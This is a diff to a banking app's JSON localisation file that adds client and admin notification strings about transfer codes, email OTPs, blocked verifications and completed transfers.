@@ -1065,5 +1065,22 @@
   "settings.codes.defaultLabel": "Finvex code",
   "verify.code.hint": "Your code",
   "verify.code.copy": "Copy code",
-  "verify.code.descGeneric": "Enter the Finvex confirmation code provided to you by the bank to continue your transfer."
+  "verify.code.descGeneric": "Enter the Finvex confirmation code provided to you by the bank to continue your transfer.",
+  "notif.adminTitle": "Admin notifications",
+  "notif.waitingCode.title": "Transfer code to enter",
+  "notif.waitingCode.body": "Your bank sent you code {{label}} for your {{amount}} € transfer. Enter it in the open window.",
+  "notif.waitingOtp.title": "Email code to enter",
+  "notif.waitingOtp.body": "A 6-digit code was sent for your {{amount}} € transfer. Enter it to continue.",
+  "notif.adminWaitingCode.title": "Client waiting for a code",
+  "notif.adminWaitingCode.body": "{{name}} is waiting for code {{label}} on a {{amount}} € transfer. Please provide the value.",
+  "notif.adminWaitingOtp.title": "Client waiting for email code",
+  "notif.adminWaitingOtp.body": "{{name}} is waiting for the OTP on a {{amount}} € transfer (after {{label}}).",
+  "notif.adminBlocked.title": "Transfer blocked",
+  "notif.adminBlocked.body": "{{name}}'s verification is blocked: {{error}}",
+  "notif.blocked.title": "Transfer interrupted",
+  "notif.blocked.body": "Verification could not continue. Please contact your advisor.",
+  "notif.completed.title": "Transfer completed",
+  "notif.completed.body": "Your transfer was completed. Reference: {{reference}}",
+  "notif.adminCompleted.title": "Transfer completed",
+  "notif.adminCompleted.body": "{{name}}'s transfer is completed. Reference: {{reference}}"
 }
